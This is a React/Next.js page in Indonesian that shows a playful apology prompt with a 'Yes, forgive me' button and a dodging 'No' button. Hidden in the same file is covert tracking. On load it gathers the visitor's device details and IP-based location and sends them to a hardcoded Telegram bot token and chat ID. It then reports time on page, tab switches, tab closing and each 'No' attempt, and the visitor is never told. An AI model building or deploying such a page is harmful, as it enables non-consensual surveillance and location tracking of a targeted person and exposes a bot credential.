"use client";
import { useState, useEffect, useRef } from "react";

export default function Page() {
  const [noCount, setNoCount] = useState(0);
  const [yesPressed, setYesPressed] = useState(false);
  const [noButtonPos, setNoButtonPos] = useState({ x: 0, y: 0 });

  const openTimeRef = useRef<number>(Date.now());
  const yesButtonSize = noCount * 20 + 16;

  const TELEGRAM_BOT_TOKEN = "8910495928:AAEjUj7ULD8BR2yx0jVbWCjF-NwLjS2F-KE";
  const TELEGRAM_CHAT_ID = "1322055359";

  const formatTime = (d: Date) => {
    return d.toLocaleTimeString("id-ID", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    });
  };

  const formatDate = (d: Date) => {
    return d.toLocaleDateString("id-ID", {
      weekday: "long",
      day: "numeric",
      month: "long",
      year: "numeric",
    });
  };

  const formatDuration = (ms: number) => {
    const totalSec = Math.floor(ms / 1000);
    const h = Math.floor(totalSec / 3600);
    const m = Math.floor((totalSec % 3600) / 60);
    const s = totalSec % 60;
    if (h > 0) return `${h} jam ${m} menit ${s} detik`;
    if (m > 0) return `${m} menit ${s} detik`;
    return `${s} detik`;
  };

  const getTimeInfo = (label: string, extra?: string) => {
    const now = new Date();
    const openTime = new Date(openTimeRef.current);
    const duration = Date.now() - openTimeRef.current;
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const offsetMin = -now.getTimezoneOffset();
    const offsetStr = `UTC${offsetMin >= 0 ? "+" : ""}${Math.floor(offsetMin / 60)}${
      offsetMin % 60 !== 0 ? `:${Math.abs(offsetMin % 60).toString().padStart(2, "0")}` : ""
    }`;

    return [
      `${label}`,
      ``,
      `🕐 <b>Jam Sekarang:</b> ${formatTime(now)}`,
      `📅 <b>Tanggal:</b> ${formatDate(now)}`,
      `⏱️ <b>Durasi di halaman:</b> ${formatDuration(duration)}`,
      `🌍 <b>Timezone:</b> ${tz} (${offsetStr})`,
      ``,
      `🟢 <b>Jam Buka Link:</b> ${formatTime(openTime)}`,
      ``,
      extra || "",
    ]
      .filter((l) => l !== undefined)
      .join("\n");
  };

  const sendTelegramNotification = async (message: string) => {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      });
    } catch (e) {
      console.error("Telegram error:", e);
    }
  };

  const gatherDeviceInfo = () => {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    if (ua.includes("Edg")) browser = "Edge";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Safari")) browser = "Safari";

    let os = "Unknown";
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Linux")) os = "Linux";

    return {
      browser,
      os,
      screenRes: `${window.screen.width}x${window.screen.height}`,
      lang: navigator.language,
    };
  };

  const getIPLocation = async () => {
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (res.ok) {
        const d = await res.json();
        return {
          ip: d.ip,
          city: d.city,
          region: d.region,
          country: d.country_name,
          countryCode: d.country_code,
          org: d.org,
        };
      }
    } catch {
      // skip
    }
    return null;
  };

  useEffect(() => {
    openTimeRef.current = Date.now();

    const run = async () => {
      const dev = gatherDeviceInfo();
      const loc = await getIPLocation();

      const openTime = new Date(openTimeRef.current);

      const message = [
        `🔔 <b>LINK DIBUKA</b>`,
        ``,
        `━━━━━━━━━━━━━━━━━━━━`,
        `🕐 <b>JAM BUKA: ${formatTime(openTime)}</b>`,
        `📅 <b>Tanggal: ${formatDate(openTime)}</b>`,
        `🌍 <b>Timezone:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
        `━━━━━━━━━━━━━━━━━━━━`,
        ``,
        `<b>📱 Device:</b>`,
        `• Browser: ${dev.browser}`,
        `• OS: ${dev.os}`,
        `• Layar: ${dev.screenRes}`,
        `• Bahasa: ${dev.lang}`,
        ``,
        loc
          ? [
              `<b>📍 Lokasi (via IP):</b>`,
              `🌐 ${loc.ip}`,
              `🏙️ ${loc.city}, ${loc.region}`,
              `🇺🇳 ${loc.country} (${loc.countryCode})`,
              `🏢 ${loc.org}`,
            ].join("\n")
          : `<b>📍 Lokasi:</b> tidak terdeteksi`,
      ].join("\n");

      await sendTelegramNotification(message);
    };

    run();

    const intervalId = setInterval(() => {
      const duration = Date.now() - openTimeRef.current;
      if (duration >= 60 * 1000) {
        const minutesOnline = Math.floor(duration / 60000);
        sendTelegramNotification(
          getTimeInfo(
            `⏳ <b>UPDATE — Masih di halaman</b>`,
            `💡 <i>Dia sudah buka link selama ${minutesOnline} menit</i>`
          )
        );
      }
    }, 60 * 1000);

    const handleVisibilityChange = () => {
      if (document.visibilityState === "hidden") {
        const closeTime = new Date();
        const duration = Date.now() - openTimeRef.current;
        sendTelegramNotification(
          [
            `👋 <b>DIA MENINGGALKAN HALAMAN</b>`,
            ``,
            `🟢 <b>Jam Buka:</b> ${formatTime(new Date(openTimeRef.current))}`,
            `🔴 <b>Jam Keluar:</b> ${formatTime(closeTime)}`,
            `⏱️ <b>Total Durasi:</b> ${formatDuration(duration)}`,
            ``,
            `📱 <i>(Pindah tab / minimize / tutup browser)</i>`,
          ].join("\n")
        );
      } else if (document.visibilityState === "visible") {
        sendTelegramNotification(
          `🔄 <b>Dia kembali ke halaman</b> pada jam <b>${formatTime(new Date())}</b>`
        );
      }
    };

    const handleBeforeUnload = () => {
      const closeTime = new Date();
      const duration = Date.now() - openTimeRef.current;

      const payload = new Blob(
        [
          JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: [
              `❌ <b>TAB/BROWSER DITUTUP</b>`,
              ``,
              `🟢 <b>Jam Buka:</b> ${formatTime(new Date(openTimeRef.current))}`,
              `🔴 <b>Jam Tutup:</b> ${formatTime(closeTime)}`,
              `⏱️ <b>Total Durasi:</b> ${formatDuration(duration)}`,
            ].join("\n"),
            parse_mode: "HTML",
          }),
        ],
        { type: "application/json" }
      );

      navigator.sendBeacon(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        payload
      );
    };

    document.addEventListener("visibilitychange", handleVisibilityChange);
    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      clearInterval(intervalId);
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, []);

  const moveNoButton = () => {
    const maxX = 100;
    const maxY = 60;
    const x = Math.random() * maxX * 2 - maxX;
    const y = Math.random() * maxY * 2 - maxY;
    setNoButtonPos({ x, y });
  };

  const handleNoInteract = () => {
    setNoCount((c) => c + 1);
    moveNoButton();
    sendTelegramNotification(
      `😏 Dia mencoba menekan <b>"Enggak"</b> (Percobaan ke-${noCount + 1})\n🕐 Jam: <b>${formatTime(new Date())}</b>`
    );
  };

  const handleYesClick = () => {
    setYesPressed(true);
    const duration = Date.now() - openTimeRef.current;
    sendTelegramNotification(
      [
        `🎉❤️ <b>DIA KLIK "IYA, MAAFIN"!</b>`,
        ``,
        `🕐 <b>Jam:</b> ${formatTime(new Date())}`,
        `⏱️ <b>Setelah:</b> ${formatDuration(duration)} buka link`,
      ].join("\n")
    );
  };

  const getNoButtonText = () => {
    const phrases = [
      "Enggak", "Yakin nih?", "kakaa minta maaf banget...",
      "Pleaseee, jangan marah lagi", 
      "PLEASE DEDEEE", "Tapi :*(",
      "kakaa sedih banget", "kakaa gak bisa tidur",
      "Pokoknya kakaa minta maaf", "BENERAN MINTA MAAF",
      ":((((", "PLISSS SAYANG",
      "kakaa nggak bisa hidup tanpa kamu", "Maafin dong :(",
    ];
    return phrases[Math.min(noCount, phrases.length - 1)];
  };

  return (
    <div className="-mt-16 flex h-screen flex-col items-center justify-center overflow-hidden">
      {yesPressed ? (
        <>
          <img src="https://media.tenor.com/gUiu1zyxfzYAAAAi/bear-kiss-bear-kisses.gif" alt="Happy" />
          <div className="my-4 text-center text-4xl font-bold">
            YEAYYY!!! Makasih ya udah maafin kakaa. <br />
            kakaa janji gak akan ngulangin lagi! ❤️
          </div>
        </>
      ) : (
        <>
          <img
            className="h-[200px]"
            src="https://gifdb.com/images/high/cute-love-bear-roses-ou7zho5oosxnpo6k.gif"
            alt="Pleading"
          />
          <h1 className="my-4 text-4xl">Mau maafin kakaa gak?</h1>

          <div className="relative h-40 w-96">
            <button
              className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 rounded bg-green-500 px-4 py-2 font-bold text-white transition-all duration-300 hover:bg-green-700"
              style={{ fontSize: yesButtonSize }}
              onClick={handleYesClick}
            >
              Iya, Maafin
            </button>

            <button
              onMouseEnter={handleNoInteract}
              onClick={handleNoInteract}
              className="absolute left-1/2 top-1/2 rounded bg-red-500 px-4 py-2 font-bold text-white transition-transform duration-200 ease-out hover:bg-red-700"
              style={{
                transform: `translate(calc(-50% + 110px + ${noButtonPos.x}px), calc(-50% + ${noButtonPos.y}px))`,
              }}
            >
              {noCount === 0 ? "Enggak" : getNoButtonText()}
            </button>
          </div>
        </>
      )}
    </div>
  );
}
